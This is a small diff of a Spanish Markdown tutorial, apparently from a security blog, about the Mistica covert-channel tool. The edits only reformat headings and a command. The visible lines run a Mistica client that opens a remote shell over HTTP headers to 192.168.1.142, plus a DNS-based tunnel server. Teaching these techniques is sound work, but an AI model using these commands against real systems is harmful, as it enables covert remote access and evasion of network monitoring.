@@ -281,8 +281,10 @@ Servidor:
 
 ![image123.png]({{site.baseurl}}/images/Mistica/image123.png)
 
-Cliente:
-`python.exe C:\Users\Sergio\Downloads\Mistica-master\mc.py -m shell:http -w "--hostname 192.168.1.142 --port 80 --header User-Agent= --success-code 404" -k key`
+**Cliente**
+
+
+`python.exe mc.py -m shell:http -w "--hostname 192.168.1.142 --port 80 --header User-Agent= --success-code 404" -k key`
 
 ![image124.png]({{site.baseurl}}/images/Mistica/image124.png)
 
@@ -304,7 +306,8 @@ Vemos una nueva cabecera llamada User-Agent donde codificada la información.
 
 ## Shell - DNS
 
-Servidor:
+**Servidor**
+
 `python3.8 ms.py -m io:dns -s "--hostname 0.0.0.0 --port 5051" -w "--queries SOA" -k key`
 
 ![image132.png]({{site.baseurl}}/images/Mistica/image132.png)
